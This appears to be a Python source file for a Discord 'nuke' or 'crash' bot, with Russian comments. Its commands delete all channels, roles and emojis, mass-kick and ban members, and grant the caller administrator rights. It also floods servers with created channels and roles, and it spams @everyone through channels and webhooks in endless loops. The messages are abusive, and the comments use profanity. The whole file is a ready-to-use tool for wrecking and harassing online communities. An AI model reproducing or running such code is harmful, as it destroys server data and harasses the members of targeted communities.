import discord
import time
import random
import asyncio
import os
import json
import inspect
import aiohttp
import datetime
import threading
from discord import Permissions
from discord_webhook import DiscordWebhook as hook, DiscordEmbed as D_Embed
from discord import client
from discord.ext import commands
from discord.utils import get
from threading import Thread
from time import sleep
import discord, random, aiohttp, asyncio
from discord import Webhook, AsyncWebhookAdapter
from colorama import Fore, init


#К сожелнию все 2 версии лавана премиума были отключенны, поэтому делал по своему
# А так же я ПЕРВЫЙ СУКА ПРИДУМАЛ ЛАВАНА ПРЕМИУМА
#Поэтому пришлось делать копию своего же бота, токо с меньшими командами
#По сути, в этом боте. Я ничего щас не делаю, просто беру код своего же бота


intents = discord.Intents.all()
client = discord.client
bot = commands.Bot(command_prefix = 'l.', intents=intents)
bot.remove_command( 'help' )






@bot.command()
async def auto(ctx):
  for x in ctx.guild.channels:
    try: await x.delete()
    except: pass
    guild = ctx.message.guild
    await guild.edit(name='Crash by JK Crashers')
  for x in ctx.guild.roles:
    try: await x.delete()
    except: pass
  for x in ctx.guild.emojis:
    try: await x.delete()
    except: pass
  for x in range(100):
    await ctx.guild.create_text_channel(name="JK Crashers")
  for x in range(100):
    await ctx.guild.create_role(name ="crash by JK Crashers")



@bot.command()
async def nuke(ctx):
  for x in ctx.guild.channels:
    try: await x.delete()
    except: pass
  for x in ctx.guild.roles:
    try: await x.delete()
    except: pass
  for x in ctx.guild.emojis:
    try: await x.delete()
    except: pass

@bot.command() 
async def admin(ctx):  
    guild = ctx.guild
    perms = discord.Permissions(administrator=True) 
    await guild.create_role(name="JK Admin", permissions=perms) 
    
    role = discord.utils.get(ctx.guild.roles, name="JK Admin") 
    user = ctx.message.author 
    await user.add_roles(role) 

    await ctx.message.delete()



@bot.event
async def on_ready():
  print(f'Бот запущен. Ник бота: {bot.user}')
  await bot.change_presence(status=discord.Status.online, activity=discord.Streaming(name=f'l.help', url='https://www.twitch.tv/jktimosha'))



@bot.command()
async def kickall(ctx):
    for m in ctx.guild.members:
        try:
            await m.kick(reason="Форзель наебщик")
        except:
            pass


@bot.command()
async def banall(ctx):
    for m in ctx.guild.members:
        try:
            await m.ban(reason="Форзель наебщик")
        except:
            pass

@bot.command()
async def delemoji(ctx):
	for emoji in ctx.guild.emojis:
	 await emoji.delete()


@bot.command()
async def channels(ctx):
    await ctx.message.delete()
    for i in range(1,100):
        await ctx.guild.create_text_channel('crashed by JK crashers')
    for i in range(1,100):
        await ctx.guild.create_voice_channel('Crashed By JK crashers')

@bot.command()
async def roles(ctx):
    for i in range(0,100):
        await ctx.guild.create_role(name = 'JK Crashers')

@bot.command()
async def delchannels(ctx):
    await ctx.message.delete()
    failed = []
    counter = 0
    for channel in ctx.guild.channels: #собираем
        try:
            await channel.delete(reason="По просьбе") #удаляем
        except: failed.append(channel.name)
        else: counter += 1


@bot.command()
async def delroles(ctx):
    await ctx.message.delete()
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass

@bot.command()
async def spamall(ctx):
  for a in range(200):
    for channel in ctx.guild.text_channels:
        try:
            await channel.send("@everyone краш")
        except:
            continue

#Типо мощный, так написанновы
@bot.command()
async def spamall1(ctx):
   await crhooks(ctx)
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))


async def crhooks(ctx):
  print(f"{Fore.WHITE}> {Fore.RED}Спамим хуками{Fore.WHITE}.")
  for channel in ctx.guild.text_channels: 
    try:
      await channel.create_webhook(name='ВЫ ЛОХИ')
      print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал хук в {channel}")
    except:
      print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не создал хук в {channel}")
      continue
  print(f"{Fore.WHITE}> {Fore.RED}Заспамили хуками{Fore.WHITE}.")


async def spamhook(ctx):
  while True:
    for channel in ctx.guild.channels:
      try:
        h = await channel.webhooks()
        for f in h:
          await f.send(content='@everyone @here Привет лохи, это я, ваш палач Destroyer, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/хуй', wait=True)
      except:
        continue
	
bot.run("")
